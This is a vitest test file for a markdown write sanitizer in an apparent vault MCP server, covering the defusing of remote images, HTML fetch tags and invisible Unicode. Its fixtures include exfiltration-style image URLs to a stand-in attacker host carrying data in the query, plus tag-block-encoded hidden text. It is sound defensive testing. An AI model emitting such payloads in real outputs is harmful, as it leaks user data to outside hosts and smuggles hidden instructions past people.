import { describe, expect, it } from 'vitest';
import { sanitizeForWrite } from '@vault-mcp/guards';

/** Encode an ASCII string into the Unicode tag block (U+E0000 offset). */
function tagEncode(text: string): string {
  return [...text]
    .map((ch) => String.fromCodePoint(0xe0000 + (ch.codePointAt(0) ?? 0)))
    .join('');
}

describe('sanitizeForWrite — inline markdown images', () => {
  it('de-embeds an http image into a link', () => {
    const out = sanitizeForWrite('![chart](http://evil.example/x.png?d=secret)');
    expect(out.content).toBe('[chart](http://evil.example/x.png?d=secret)');
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('1 remote image'),
    );
  });

  it('de-embeds an https image into a link', () => {
    const out = sanitizeForWrite('see ![alt text](https://evil.example/p.png) here');
    expect(out.content).toBe('see [alt text](https://evil.example/p.png) here');
  });

  it('preserves the title when de-embedding', () => {
    const out = sanitizeForWrite('![a](https://evil.example/i.png "the title")');
    expect(out.content).toBe('[a](https://evil.example/i.png "the title")');
  });

  it('de-embeds protocol-relative images', () => {
    const out = sanitizeForWrite('![a](//cdn.example/i.png)');
    expect(out.content).toBe('[a](//cdn.example/i.png)');
  });

  it('de-embeds angle-bracketed remote targets', () => {
    const out = sanitizeForWrite('![a](<https://evil.example/i.png>)');
    expect(out.content).toBe('[a](<https://evil.example/i.png>)');
  });

  it('strips data: images entirely, keeping the alt text', () => {
    const out = sanitizeForWrite(
      'x ![payload](data:image/png;base64,AAAABBBB) y',
    );
    expect(out.content).toBe('x [payload] y');
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('1 data: image'),
    );
  });

  it('leaves local relative images untouched', () => {
    const input = '![diagram](assets/diagram.png) and ![b](./img/pic.jpg)';
    const out = sanitizeForWrite(input);
    expect(out.content).toBe(input);
    expect(out.report.removed).toEqual([]);
  });

  it('leaves vault-absolute (single slash) images untouched', () => {
    const input = '![a](/attachments/pic.png)';
    expect(sanitizeForWrite(input).content).toBe(input);
  });

  it('leaves Obsidian wikilink embeds untouched', () => {
    const input = 'see ![[attachment.png]] inline';
    const out = sanitizeForWrite(input);
    expect(out.content).toBe(input);
    expect(out.report.removed).toEqual([]);
  });
});

describe('sanitizeForWrite — reference-style images', () => {
  it('de-embeds full reference usages', () => {
    const out = sanitizeForWrite('![alt][ref]\n\n[ref]: https://evil.example/x.png');
    expect(out.content).toBe('[alt][ref]\n\n[ref]: https://evil.example/x.png');
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('1 reference-style image'),
    );
  });

  it('de-embeds collapsed references', () => {
    const out = sanitizeForWrite('![alt][]');
    expect(out.content).toBe('[alt][]');
  });

  it('de-embeds shorthand references', () => {
    const out = sanitizeForWrite('a ![alt] b');
    expect(out.content).toBe('a [alt] b');
  });

  it('de-embeds local references too (degrades to a link, harmless)', () => {
    // Whether the definition is remote cannot be decided per-usage.
    const out = sanitizeForWrite('![local][pic]\n\n[pic]: assets/pic.png');
    expect(out.content).toBe('[local][pic]\n\n[pic]: assets/pic.png');
  });
});

describe('sanitizeForWrite — HTML fetch vectors', () => {
  it('replaces a remote <img> with a placeholder', () => {
    const out = sanitizeForWrite('<img src="https://evil.example/p.png" alt="x">');
    expect(out.content).toBe(
      '[external content removed: https://evil.example/p.png]',
    );
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('1 HTML element'),
    );
  });

  it('replaces an <img> whose srcset has a remote candidate', () => {
    const out = sanitizeForWrite(
      '<img srcset="local.png 1x, //evil.example/big.png 2x">',
    );
    expect(out.content).toBe('[external content removed: //evil.example/big.png]');
  });

  it('replaces remote <source>, <video>, <audio> tags', () => {
    const out = sanitizeForWrite(
      [
        '<source srcset="https://evil.example/s.png 1x">',
        '<video poster="http://evil.example/p.jpg">fallback</video>',
        '<audio src="https://evil.example/a.mp3">',
      ].join('\n'),
    );
    expect(out.content).not.toContain('<source');
    expect(out.content).not.toContain('<video');
    expect(out.content).not.toContain('<audio');
    expect(out.content).toContain(
      '[external content removed: https://evil.example/s.png]',
    );
    expect(out.content).toContain(
      '[external content removed: http://evil.example/p.jpg]',
    );
    expect(out.content).toContain(
      '[external content removed: https://evil.example/a.mp3]',
    );
  });

  it('replaces remote <iframe>, <embed>, <object>, <link> tags', () => {
    const out = sanitizeForWrite(
      [
        '<iframe src="https://evil.example/frame"></iframe>',
        '<embed src="http://evil.example/e.swf">',
        '<object data="//evil.example/o.swf"></object>',
        '<link rel="stylesheet" href="https://evil.example/a.css">',
      ].join('\n'),
    );
    expect(out.content).not.toContain('<iframe');
    expect(out.content).not.toContain('<embed');
    expect(out.content).not.toContain('<object');
    expect(out.content).not.toContain('<link');
    expect(out.content).toContain(
      '[external content removed: https://evil.example/frame]',
    );
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('4 HTML elements'),
    );
  });

  it('handles single-quoted and unquoted attribute values', () => {
    const out = sanitizeForWrite(
      "<img src='https://evil.example/sq.png'>\n<img src=https://evil.example/uq.png>",
    );
    expect(out.content).not.toContain('<img');
    expect(out.content).toContain('sq.png]');
    expect(out.content).toContain('uq.png]');
  });

  it('leaves local HTML images and media untouched', () => {
    const input =
      '<img src="assets/local.png" alt="x"><video src="/media/clip.mp4"></video>';
    const out = sanitizeForWrite(input);
    expect(out.content).toBe(input);
    expect(out.report.removed).toEqual([]);
  });

  it('leaves non-fetching HTML like <a> and <b> untouched', () => {
    const input = '<a href="https://example.com">link</a> <b>bold</b>';
    expect(sanitizeForWrite(input).content).toBe(input);
  });
});

describe('sanitizeForWrite — invisible characters and tag block', () => {
  it('strips invisible characters on the write path too', () => {
    const out = sanitizeForWrite('w\u200Bord \uFEFFbom so\u00ADft');
    expect(out.content).toBe('word bom soft');
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('3 invisible characters'),
    );
  });

  it('strips Unicode tag-block characters on the write path too', () => {
    const out = sanitizeForWrite(`ok${tagEncode('exfil this')}`);
    expect(out.content).toBe('ok');
    expect(out.report.removed).toContainEqual(
      expect.stringContaining('10 Unicode tag-block characters'),
    );
  });
});

describe('sanitizeForWrite — combined behavior', () => {
  it('defeats nested image trickery (!![alt](url))', () => {
    const out = sanitizeForWrite('!![d](http://evil.example/i.png)');
    expect(out.content).toBe('[d](http://evil.example/i.png)');
  });

  it('defeats an image spliced together by invisible characters', () => {
    const out = sanitizeForWrite('!\u200B[a](https://evil.example/x.png)');
    expect(out.content).toBe('[a](https://evil.example/x.png)');
  });

  it('is idempotent on adversarial input', () => {
    const fixture = [
      '![a](https://evil.example/x.png?d=1)',
      '![t](https://evil.example/y.png "title")',
      '![b][ref]',
      '![c]',
      '!![d](http://evil.example/i.png)',
      '![p](data:text/plain;base64,SGVsbG8=)',
      '<img src="https://evil.example/p.png">',
      '<img srcset="a.png 1x, //evil.example/b.png 2x">',
      'w\u200Bord',
      `x${tagEncode('hi')}`,
      '![local](assets/keep.png)',
    ].join('\n');
    const once = sanitizeForWrite(fixture);
    const twice = sanitizeForWrite(once.content);
    expect(twice.content).toBe(once.content);
    expect(twice.report.removed).toEqual([]);
    // the local image must have survived both passes
    expect(twice.content).toContain('![local](assets/keep.png)');
  });

  it('returns clean input unchanged with an empty report', () => {
    const clean = [
      '# Daily note',
      '',
      'Text with a [link](https://example.com) and a local image:',
      '![sketch](attachments/sketch.png)',
      '',
      '```md',
      'plain code fence',
      '```',
    ].join('\n');
    const out = sanitizeForWrite(clean);
    expect(out.content).toBe(clean);
    expect(out.report.removed).toEqual([]);
  });

  it('handles empty input', () => {
    const out = sanitizeForWrite('');
    expect(out.content).toBe('');
    expect(out.report.removed).toEqual([]);
  });
});
